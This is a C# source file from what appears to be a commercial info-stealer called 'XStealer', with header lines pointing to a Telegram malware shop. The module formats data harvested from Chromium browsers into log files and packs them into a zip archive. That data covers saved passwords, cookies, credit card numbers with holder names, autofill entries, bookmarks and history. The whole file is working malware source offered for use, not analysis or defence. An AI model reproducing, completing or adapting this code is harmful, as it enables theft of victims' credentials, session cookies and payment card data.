// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using Helpers;

    public static class CFormatLog
    {
        #region Format Passwords Log | Для записей паролей в файл (формат лога)
        private static string FormatPassword(Structures.Password_Chromium pPassword) => $"Hostname: {pPassword.C_Url}\nUsername: {pPassword.C_Username}\nPassword: {pPassword.C_Pass}\nBrowser: {pPassword.C_BrowserName}\r\n\r\n";
        public static bool WritePasswords(List<Structures.Password_Chromium> pPasswords, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.Password_Chromium pPassword in pPasswords)
            {
                if (!string.IsNullOrWhiteSpace(pPassword.C_Username) && !string.IsNullOrWhiteSpace(pPassword.C_Pass))
                {
                    try
                    {
                        byte[] stringToBytes = ConverterEx.ToBytes(false, FormatPassword(pPassword));
                        ms.Write(stringToBytes, 0, stringToBytes.Length);
                    }
                    catch { continue; }
                }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format Cookies Log | Для записей куков в файл (формат лога)
        private static string FormatCookie(Structures.Cookie_Chromium cCookie) => $"{cCookie.C_HostKey}\tTRUE\t{cCookie.C_Path}\tFALSE\t{cCookie.C_ExpiresUtc}\t{cCookie.C_Name}\t{cCookie.C_Value}\r\n";
        public static bool WriteCookies(List<Structures.Cookie_Chromium> cCookies, string fileName)
        {
            // Выделяем поток для чтения в памяти
            using var ms = new MemoryStream { Position = 0 };
            // Перебираем данные Cookies
            foreach (Structures.Cookie_Chromium cCookie in cCookies)
            {
                try
                {
                    // Записываем данные в память
                    byte[] stringToBytes = ConverterEx.ToBytes(false, FormatCookie(cCookie));
                    ms.Write(stringToBytes, 0, stringToBytes.Length);
                }
                catch (Exception)
                {
                    continue;
                } 
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format Credits Log | Для записей кредиток в файл (формат лога)
        private static string FormatCreditCard(Structures.CreditCard_Chromium cCard) => $"Type: {CreditsParser.DetectCreditCardType(cCard.C_Number)}\nNumber: {cCard.C_Number}\nExp: {$"{cCard.C_ExpMonth}/{cCard.C_ExpYear}"}\nHolder: {cCard.C_Name}\n\n";
        public static bool WriteCreditCards(List<Structures.CreditCard_Chromium> cCC, string fileName)
        {
            // Выделяем поток для чтения в памяти
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.CreditCard_Chromium aCC in cCC)
            {
                try
                {
                    byte[] stringToBytes = ConverterEx.ToBytes(false, FormatCreditCard(aCC));
                    ms.Write(stringToBytes, 0, stringToBytes.Length);
                }
                catch { continue; }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }

        #endregion

        #region Format Bookmarks Log | Для записей закладок в файл (формат лога)
        private static string FormatBookmark(Structures.Bookmark_Chromium bBookmark) => !string.IsNullOrEmpty(bBookmark.C_Url) ? $"[ {bBookmark.C_Title} ] ({bBookmark.C_Url})\n" : $"[ {bBookmark.C_Title} ]\n";
        public static bool WriteBookmarks(List<Structures.Bookmark_Chromium> bBookmarks, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.Bookmark_Chromium bBookmark in bBookmarks)
            {
                try
                {
                    byte[] stringToBytes = ConverterEx.ToBytes(false, FormatBookmark(bBookmark));
                    ms.Write(stringToBytes, 0, stringToBytes.Length);
                }
                catch { continue; }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format AutoFills Log | Для записей автозаполнений браузера в файл (формат лога)
        private static string FormatAutoFill(Structures.AutoFill_Chromium aFill) => $"Name: {aFill.C_Name}\t\nValue: {aFill.C_Value}\t\n===============\n";
        public static bool WriteAutoFill(List<Structures.AutoFill_Chromium> aFills, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.AutoFill_Chromium aFill in aFills)
            {
                try
                {
                    byte[] stringToBytes = ConverterEx.ToBytes(false, FormatAutoFill(aFill));
                    ms.Write(stringToBytes, 0, stringToBytes.Length);
                }
                catch (Exception) { continue; }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format Histories Log | Для записей историй браузера в файл (формат лога)
        private static string FormatHistory(Structures.History_Chromium history) => $"[ {history.C_Title} ] ({history.C_Url}) {history.C_Count}\n";
        public static bool WriteHistory(List<Structures.History_Chromium> sHistory, string fileName)
        {
            // Выделяем поток для чтения в памяти
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.History_Chromium data in sHistory)
            {
                long size = FileX.GetInfoFile(fileName); // Размер файла данных
                int LimitFile = 400000; // Максимальный лимит заполнения данных
                if (size <= LimitFile) // Проверка на превышения заданного лимита
                {
                    try
                    {
                        // Записываем данные в память
                        byte[] stringToBytes = ConverterEx.ToBytes(false, FormatHistory(data));
                        ms.Write(stringToBytes, 0, stringToBytes.Length);
                    }
                    catch { continue; }
                }
            }
             ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion
    }
}